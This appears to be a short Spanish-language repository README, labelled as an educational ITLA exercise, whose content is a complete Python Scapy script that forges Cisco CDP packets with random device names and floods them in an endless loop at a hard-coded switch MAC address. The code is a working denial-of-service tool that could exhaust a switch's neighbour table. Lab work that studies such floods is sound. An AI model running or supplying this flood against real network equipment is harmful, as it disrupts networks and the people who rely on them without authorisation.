# Ataque-DoS-CDP-con-Scapy
Script utilizando Scapy para ataque DoS mediante el protocolo CDP ( Prueba ITLA FINES EDUCATIVOS )


#!/usr/bin/env python3
from scapy.all import *
import struct

INTERFACE = "ens33"
MY_MAC = "00:0c:29:ae:8e:05"
SWITCH_MAC = "c2:02:2c:60:f2:01" 

def get_checksum(data):
    if len(data) % 2 != 0: data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16: s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF

def generar_paquete():
    nombre = f"ITLA-{RandString(4)}".encode()
    tlv_id = b'\x00\x01' + struct.pack("!H", len(nombre) + 4) + nombre
    tlv_port = b'\x00\x03\x00\x0cFa2/1' 
    tlv_cap = b'\x00\x04\x00\x08\x00\x00\x00\x01'
    cuerpo_base = b'\x02\x78\x00\x00' + tlv_id + tlv_port + tlv_cap
    csum = get_checksum(cuerpo_base)
    cdp_final = cuerpo_base[:2] + struct.pack("!H", csum) + cuerpo_base[4:]
    long_total = len(cdp_final) + 8 
    
    return Ether(dst=SWITCH_MAC, src=MY_MAC, type=long_total) / \
           LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
           SNAP(OUI=0x00000c, code=0x2000) / \
           Raw(load=cdp_final)

def flood():
    print(f"[*] Generando ráfaga de ataque hacia {SWITCH_MAC}...")
    pkts = [generar_paquete() for _ in range(100)]
    
    try:
        while True:
            sendp(pkts, iface=INTERFACE, verbose=False)
    except KeyboardInterrupt:
        print("\n[*] Ataque detenido.")

if __name__ == "__main__":
    flood()
